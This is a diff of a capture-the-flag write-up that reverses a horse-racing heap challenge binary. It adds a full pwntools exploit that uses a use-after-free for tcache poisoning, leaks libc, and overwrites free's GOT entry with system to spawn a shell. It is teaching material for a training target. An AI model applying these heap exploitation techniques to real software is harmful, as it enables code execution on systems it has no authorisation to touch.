@@ -7,33 +7,37 @@ From the challenge description this is heap exploitation?
 This will be my first heap exploitation challenge, sounds fun!
 
 ## First impressions
-
 Apart from proving an executable for us to examine, we are also provided with a libc shared object and ld-linux shared object file. The executable will not run unless these files exist and have their permissions changed to be executable.
-
+<br>
 ![add desc](images/firstImpressions.png)
+<br>
 When you do something wrong (like entering a name when the game prompts for name length) the game just kicks you out. 
-
 Going over the character limit when setting the horse name doesn't do anything, as it turns out the extra characters just get ignored. 
+<br>
 ![add desc](images/weirdLengthThing.png)
-
+<br>
 You must add horses in order to race, you can have a maximum of 18 horses as the stable index range is 0-17.
 After you have 5 or more horses added, you can start racing. The horses all line up to race and go towards the finish line as the game prints out a nice representation of the horses' positions on the field.
+<br>
 ![horses](images/race.png)
-
+<br>
 Long names get trunctuated to only 16 characters, it looks like it takes the first 16 characters of the horse name to display when racing, although when the winner is printed out we get the full name of the horse.
+<br>
 ![add desc](images/trunctoBeg.png)
-
+<br>
 There is also a remove option that lets you remove an existing horse. 
-
+<br>
 ## Reversing the binary
-
+<br>
 Now that all features have been explored, lets open the game in ghidra and see how it looks. <br>
 Oh no where did all the symbols go (it is stripped file D:)
-![add desc](images/noSymbols.png)
-
+<br>
+![sy](images/noSymbols.png)
+<br>
 We can still use entry point to find main though, so its not too big of a deal! It seems main is located at `0x401c0c`
+<br>
 ![We find entry](images/findingEntry.png)
-
+<br>
 Lets go to main and take a look at whats happening
 
 ```c
@@ -81,7 +85,11 @@ undefined8 main(void)
 }
 ```
 
+### Variables and setup functions
+<br>
 Before going on with analysis of the game I want to note that there should be a switch statement in the decompiler output, but Ghidra was unable to properly display it. I solve this later by using the switch override script and manually specifying the jump destinations. The version of Ghidra used was 10.3 and it seems 10.1.3 doesn't have this issue so downgrading would also fix this.
+
+First lets look at what happens before the game enters the while loop that gets player inputs.
 
 0x120 bytes malloc()ed to **local_18**, which is then passed to **FUN_0040130f**, **FUN_00401b4d** is
 called without arguments and doesn't return anything, we'll have to look into that.
@@ -92,6 +100,7 @@ if it is nonzero, it is init to zero so one of the 4 options must change its val
 **local_24** is probably user input seeing how it is read into, I'll rename it **userInput**.
 
 Lets look at **FUN_00401b4d** first, it is the one passed no arguments
+
 ```c
 void FUN_00401b4d(void)
 
@@ -145,18 +154,21 @@ It seems it divides these 0x120 bytes into 0x12 segments with 0x10 bytes each
 
 `0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 |valc 0x00 0x00 0x00| 0x00 0x00 0x00 0x00`
 
-Here is image of horses after being setup on the heap
-![horses](images/initHorses.png)
+Here is an image of the horses after being setup on the heap
+![horses](images/heapHorses.png)
 
 This suggests that **local_18** might be an array with 0x12 elements, although there are multiple data types in each element. 0x12 is 18 in decimal, and we can have at most 18 horses, this means that **local_18** is an array of horse data structures. Based on how the function acts on this array, it seems that each horse data structure contains one 8 byte field and two 4 byte fields. Ok lets rename **local_18** to **horseData** and make it of type horseStruct*
 
 ![horses](images/horseInformation.png)
 
-### Addressing broken switches
-Most people won't have this problem I had, but I think i'm still going to include this section because it was something I had to solve in order to complete this challenge. You can skip this section if you want to, its not very important for solving this challenge in general.
-Ghidra wasn't able to display the switch that involved basically all of the game logic so I had to take a look at some of the assembly instructions to figure out what was happening.<br>
-![switch instructions](images/switchInstructions.png)
+Now that we have an idea of what all the different variables are, we can move on to seeing what happens when we actually start playing the game.
 
+### Addressing broken switches
+Most people won't have this problem I had, but I think I'm still going to include this section because it was something I had to solve in order to complete this challenge. You can skip this section if you want to, its not very important for solving this challenge in general.
+Ghidra wasn't able to display the switch that involved basically all of the game logic so I had to take a look at some of the assembly instructions to figure out what was happening.
+<br>
+![switch instructions](images/switchInstructions.png)
+<br>
 As you can see, Ghidra isn't able to dissasemble any of the  bytes beyond where the different switch cases start. Looking at the instructions, a jump table is used to determine the addresses to jump to. This table is located at **0x402288** and consists of signed 4 byte integers.  The game adds these integers to the base address of the jump table, and because the jump table is so close to where the instructions to jump to are, it only needs to use 4 byte integers instead of 8 byte long integers. 
 
 The jump table values are:
@@ -328,9 +340,9 @@ undefined8 addHorse(horseStruct *horse)
 
 First the game recieves the stable index, which it indexes into horseData with. There is no overflow here because it checks if the stable index is within the bounds of the array. When the game gets the stable index, it checks if one of its fields **horseShort2** is set to zero, if its not, it tells us the stable location is already in use and returns a nonzero value, this will cause **exitCondition** to be set to something other then zero and kick us out of the game. If **horseShort2** isn't set, it checks for a name length to see if its within bounds (16-256) and allocates a buffer in heap to store the horse's name. It sets the horse's **horseLong** field to the buffer's address meaning that **horseLong** is a pointer to its name. The function **FUN_00401226** is tasked with populating this buffer with a name, it is passed the length of the name and the buffer address. Afterwards it sets **horseShort2** to 1 and returns. This means **horseShort2** marks whether a horse is in use.
 Now we can update horseStruct
-
+<br>
 ![updated horse struct](images/horseInformation2.png)
-
+<br>
 Lets rename **FUN_00401226** to **setHorseName** and take a look at what it does
 
 ```c
@@ -419,9 +431,9 @@ Remove horse asks the player for a valid number to index into the **horseData** 
 ```
 
 The game has a secret option for when you give it zero as a choice, it doesn't tell you about this when it prompts you for a choice. It lets you set the first 16 characters of your horse's name to something different and change their "spot". However, the game will not let you race after you do this and says you are cheating. This is because in the code above, **DAT_004040ec** is set and the game checks this variable before racing. I will rename **DAT_004040ec** to **cheating** and the function that is called to **cheat**
-
+<br>
 ![cheating](images/cheating.png)
-
+<br>
 Lets take a look at what the cheat function does
 
 ```c
@@ -460,9 +472,9 @@ void cheat(horseStruct *horseData)
 After taking the horse to perform the cheat on, the game calls **setHorseName** with length argument 0x10, meaning the first 16 characters of the horse's name will be changed (unless the player inputs "\xff"). Unlike **addHorse**, this function does not check if the horse is in use (thus has an allocated **horseName**) before calling **setHorseName**. This means if we call **cheat** on a horse we previously removed, we will be editing the metadata of a freed chunk! 
 
 Afterwards the player is asked to set a "New spot" which the game sets the target horse's **horseShort1** field, it seems like this field represents the position of the horse. Now we have all the information about the contents of the horse data structures contained in the **horseData** array.
-
+<br>
 ![add data](images/horseStructFinished.png)
-
+<br>
 #### Race - Option 3
 ```c
       case -0x540:
@@ -711,9 +723,9 @@ time.sleep(2)
 ```
 
 This code adds 3 horses and removes two of them in backward order. This will cause 2 chunks to end up in tcache with horse 1 being at the front, then we overwrite the forward pointer of horse one so that libc sees the second chunk as `0xdeadbeef` Then we can run gdb and take a look at the bins! 
-
+<br>
 ![bins via overwrite](images/weirdBins.png)
-
+<br>
 Looks like we got the first chunk to point to something else! But wait a minute... GDB reports that the address of this chunk is `0xdeadbee0d3` when we overwrote **fd** with `0xdeadbeef00`, what happened here??? It turns out that tcache bins and safe bins have a feature called safe linking to add an extra layer of security to the pointers! When we store a pointer in **fd** we actually store a mangled version of this pointer. What happens is we take the address that the pointer is stored at, shift it to the right by 12 bits, and xor it with the actual pointer and use that instead. Likewise we do the same thing to get the actual address.
 
 ```
@@ -798,7 +810,7 @@ cheat(1, pwn.p64(0xdeadbeef00 ^ ASLR) + b"\xff")
 pwn.gdb.attach(p, "heap bins") 
 time.sleep(2)
 ```
-
+<br>
 ![parsing leaked data](images/leakedHeap.png)
 <br>
 Now libc recognizes what we are pointing to!
@@ -856,9 +868,9 @@ return min(leakedPointers), max(leakedPointers)
 ```
 
 Now an unsorted bin appears and it holds a pointer into libc! Even better, this pointer isn't mangled because safe linking only applies to fast and tcache bins!
-
+<br>
 ![unsorted bins forced](images/gotUnsorted.png)
-
+<br>
 Now that we have leaked a libc address, we just need to find a value to offset it from to get libc base! The libc base can be found by typing `info proc mappings` into gdb and then you can subtract it from the value that is leaked. The number to add to the leaked address in this case is `-0x1bde10` (Although it seems allocating and freeing different numbers of chunks results in different numbers). 
 
 ```python
@@ -873,89 +885,42 @@ libcFile.address = libcBase
 ### Getting a shell
 
 We have libc base and the ability to allocate a chunk of memory at arbitrary addresses, we can combine these abilities to overwrite a function address in the GOT and point it to system! Lets find a suitable function to replace. 
-
+<br>
 ![lets replace free](images/findingGOT.png)
-
+<br>
 Free seems like a good function to replace, we can remove a horse named "/bin/sh" which will free() it, if free is replaced with system we will get a shell! Free is at address 0x404018, so we want a chunk that starts there. However, libc wants chunk addresses aligned to 0x10 bytes so we must actually start at 0x404010, therefore after we allocate our chunk we need to write 8 bytes of filler before we write the address of system. 
 
-When allocating from the tcache bins, we allocate from the head, or the most recently freed chunk. After allocating from this chunk, libc will save the **fd** 
+#### Locally
 
-In race there is function I name checkForEnd that lookas at one of the numbers set in initheap
-and sees if one is above 0x1d so I think its not actually stableIndex but position of horse
-
-Function called later adds a number between 0-4 to horse position for every horse
-
-
-Looking at gdb I look at heap to see what happens when add hors
-
-Usefule info???
-
-```
-Redefine command "hook-stop"? (y or n) y
-Type commands for definition of "hook-stop".
-End with a line saying just "end".
->x/80wx 0x405290
->x/40wx 0x004055b0 - 0x10
->end
-(gdb) info breakpoints 
-Num     Type           Disp Enb Address            What
-1       breakpoint     keep y   0x0000000000401c65 
-	breakpoint already hit 2 times
-(gdb) 
-```
-
-Oppsie daisy looks like I forgot to look at remove horse function silly me :P
-It turns out it frees the name pointer associated with the horse, but it does not get rid
-of the pointer, so it is still in memory. This pointer can be accessed by headStart() because
-it does not check if use bit is set before writing to address (hence why headStart on non-initialized
-horse causes segfault because it is trying to write to NULL) Use after freee????
-
-Doing some heap work I was going to give up until I looked a bit at a video by sloppyJoePirates and an azeria-labs
-guide on heap exploitation. I still don't know if I'll be able to solve this but I do wanna explore a bit more.
-
-Video points out as I failed to realize that writing \0xff to setHorseName or whatever function it is stops it from
-reading anymore because it stops writing when char is -1 (255 = 0xff) for some weird reason. Basically you can make
-horse which allocates a chunk, don't write anything to name, free horse, and make a new horse which will put it on the
-same freed chunk. User data will have forward and backward pointers as long as you don't write anything when the game
-asks for horse name (0xff) so when you race the game will leak these pointers.
-
-Using GEF 
-![unsorted bins](images/forceUnsortedBins.png)
-
-From other writeups I learned that the fd pointers for heap chunks use something called safe linking which just means
-that the fd pointer is mangled up a bit. What happens is you take the address of the fd pointer, shift it the the right
-by 12 bits (you lose data), and xor it with the fd pointer. This makes it harder to do stuff even after leaking data because
-you don't know where the fd pointer is pointing without the address of the fd pointer. However, this also means that theres
-a way to leak the address of one special fd pointer, specifically tcache end of linked list. This pointer will be NULL, so
-what happens is address >> 12 is xored with zero so the value stored here (which we can read) is just the address shifted
-right by 12, precisely the value we need to forge a valid fd! Therefore if we can get target tcache chunk to be last at
-linked list (this is done by having it added to tcache bin first), we can "sign" valid file pointers and pwn!!! I think you
-can also use this to get address of code to pwn
-
-Operation so far:
-Allocate horses x12 (0-11)
-HHHHHHHHHHHH
-Free horses starting from end remove horses (11-0)
-HHHHHHHHHHH<
-HHHHHHHHHH<
-HHHHHHHHH<
-HHHHHHHH<
-HHHHHHH<
-HHHHHH<
-HHHHH<
-These go into tcache bin rest end up becoming unsorted
-UUUUU		(unsorted chunks)
-TTTTTT**T**		(tcache bold one should leak because it was free()ed first)
-
-So basically horse 11 should have cheat go into it?
-
-I've written some code that gets leaked addresses here is output
-![leaked](images/gotLeakedAddress.png)
-As you can see, 12 horses were initialized, but only 8 values were returned, this is because some of the horses were in
-the large unsorted chunk, and some of the data areas are set to zero. The code ignores zeros, so this is all that is output.
-Code looks like this
+Now lets put that information to use! here is the code that will pop a shell
 
 ```python
+#! /usr/bin/python
+import pwn
+import time
+
+pwn.context(binary="./vuln")
+pwn.context(terminal=["xfce4-terminal", "-e"])
+elf = pwn.ELF("./vuln")
+libcFile = pwn.ELF("./libc.so.6")
+p = elf.process()
+
+def addHorse(stableIndex, nameLength, name):
+	p.sendlineafter("Choice: ", b"1")
+	p.sendlineafter("Stable index # (0-17)? ", bytes(str(stableIndex), encoding="ascii"))
+	p.sendlineafter("Horse name length (16-256)? ", bytes(str(nameLength), encoding="ascii"))
+	p.sendlineafter(f"Enter a string of {nameLength} characters: ", name)
+
+def removeHorse(stableIndex):
+	p.sendlineafter("Choice: ", b"2")
+	p.sendlineafter("Stable index # (0-17)? ", bytes(str(stableIndex), encoding="ascii"))
+
+def cheat(stableIndex, name):
+	p.sendlineafter("Choice: ", b"0")
+	p.sendlineafter("Stable index # (0-17)? ", bytes(str(stableIndex),  encoding="ascii"))
+	p.sendlineafter("Enter a string of 16 characters: ", name)
+	p.sendlineafter("New spot? ", b"0")
+
 def getPointers():
 	p.sendlineafter("Choice: ", b"3")
 	data = b""
@@ -978,41 +943,75 @@ def getPointers():
 		if (pointer != 0):
 			leakedPointers.append(pointer)
 			print(hex(pointer))
+	print(f"The value you seek is {hex(min(leakedPointers))}")
+	print(f"Libc leak at {hex(max(leakedPointers))}!")
+	return min(leakedPointers), max(leakedPointers) 
+
 	
-	print(leakedPointers)
+
+#malloc some chunks of same size
+for i in range(9):
+	print(f"adding horse {i}")
+	addHorse(i, 256, b"\xff")
+
+#free these chunks and put them in tcache
+for i in range(8, -1, -1):
+	print(f"removing horse {i}")
+	removeHorse(i)
+
+#ensure we have unsorted bin
+pwn.gdb.attach(p, "heap bins")
+time.sleep(2)
+
+#these chunks are returned to us with metadata in them
+#horses 0-6 are in tcache, horses 7-8 are in unsorted
+for i in range(9):
+	print(f"adding horse {i}")
+	addHorse(i, 256, b"\xff")
+
+#we start racing and grab the leaked data
+magicNumber = -0x1bde10
+ASLR, libc = getPointers()
+#get libc base and set address of pwn elf file object to it
+libcBase = libc + magicNumber
+libcFile.address = libcBase
+
+#put two horses into tcache bin
+removeHorse(0)
+removeHorse(1)
+
+#horse 1 is the first horse, make it point to 0x404010 instead of horse 0
+cheat(1, pwn.p64(0x404010 ^ ASLR) + b"\xff")
+
+#examine our work (make sure there is 0x404010 pointer)
+pwn.gdb.attach(p, "heap bins") 
+time.sleep(2)
+
+#the first horse we allocate will come from a horse that is actually in heap, the next one will point to our target
+addHorse(0, 256, b"/bin/sh\xff")
+
+
+#this horse will replace the got entry for free with the address of system
+system = pwn.p64(libcFile.symbols['system'])
+addHorse(1, 256, pwn.p64(0) + system + b"\xff")
+
+#goodbye "/bin/sh", you were a good horse
+removeHorse(0)
+p.interactive()
+
 ```
+<br>
+![popping shell locally](images/epicPwn.png) 
+<br>
 
-Sorry for very messy
-From the output, everything below the large value containing 0x7fcaa4357040 is part of what was unsorted bin
-Of course horse containing this addr should be 8th horse allocated (because it gets allocated after all the
-tcache bins are allocated, so this is the orse in stable 7) Likewise horse containing forgable value is horse
-6 because it goes into the tcache bin that was last freed.
+#### Challenge instance
 
-Wait heap addresses are very large and what we get are heap shifted right 12 bits so almost all other pointers should
-be heap shifted right 12 bits too so that means we can use the value thats leaked to decode addresses of all fd pointers
-that are leaked!!! (and sign too)
+*I broke this section*
 
-Ok what??? So there are two values that get leaked that are one off to each other, one can be used to sign/decode tcache addresses
-but the heap base address is different so it doesn't work for unsorted which means no libc :( but everytime I check gdb the key
-for unsorted is alyways the latter of the two values thats one off, and its from a chunk in the middle of unsorted. Whaaat?
-What does this mean
+Now that we can get a shell locally, we need to do it on the actual challenge instance so we can get our flag! This means we can't randomly attach gdb to debug our exploit anymore. Doing this on the challenge instance is mostly the same as locally, but you use a remote connection instead of a binary. I also ssh into a different server when connecting to pico challenge instances and it recieved "\r\n" in place of "\n" when the horses were racing, so that needed to be accounted for too in the parsing code.
 
-Ok it turns out pointer mangling happens on Tcache chunks but they do not happen on unsorted chunks so those are free to
-exploit, I was trying to unmangle unsorted chunk FD pointers the entire time when that wasn't neccessary, which resulted in
-wrong guesses for libc base. When I realized this, I started getting being able to correctly find libc base addr based on 
-these leaks, now can do tcache poison and pwn!!!
+Oh no it doesn't run and everything is broken
 
-First find address to override in GOT. We can choose any function that will be called later, we can change this function address
-to that of libc sys and pass it a pointer to a string "/bin/sh", if we use free we can do just that, so lets overwrite free
-to sys call and name a horse "/bin/sh" to pass it to.
-
-![finding free](images/findingFree.png)
-
-Free is at 0x404018 but we need to align addresses by 0x10 so we need to alloc 8 bits below free at 0x404010. What we can do
-is free two horses which will place two chunks into tcache bin. Bin -> T1 -> T2, We can modify T1 next pointer, normally
-it will point to T2, but we can set it to point to 0x404010 (also note that value at 0x404010 is 0x0000000000000000 so it will
-appear as end of chain). Afterwards we can allocate a chunk of same size as bin size which will allocate a bin at where
-T1 points, giving us the ability to write to 0x404010. 
 
 
 
